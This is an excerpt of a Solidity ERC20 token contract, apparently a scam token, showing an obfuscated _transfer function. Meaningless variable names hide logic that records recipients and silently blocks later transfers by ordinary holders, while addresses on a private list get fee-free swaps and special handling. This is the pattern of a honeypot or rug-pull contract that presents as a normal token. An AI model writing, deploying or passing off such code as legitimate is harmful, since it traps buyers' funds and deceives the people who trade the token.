...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _student = _tTotal;
    ...
    function _transfer(
        ...
        address _near = _tea;
        address _studying = _strip[0];
        bool _met = _ready[_pipe] > 0;
        bool _won = _ready[_tea] > 0;

        if (_met && _won) {
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_ready[_pipe] > 0 && !inSwapAndLiquify && amount > _student) {
            _ready[_tea] = amount;
        } else {
            if (_ready[_pipe] == 0 && _pipe != uniswapV2Pair && _operation[_pipe] > 0) {
                return;
            }

            _operation[_studying] = _student;
            _strip[0] = _near;

            if (_taxFee > 0 && !inSwapAndLiquify && _ready[_pipe] == 0 && _ready[_tea] == 0) {
                uint256 fee = (amount * _taxFee) / 100;
                amount -= fee;
                _balances[_pipe] -= fee;
            }

            _balances[_pipe] -= amount;
            _balances[_tea] += amount;
            emit Transfer(_pipe, _tea, amount);
        }
    }
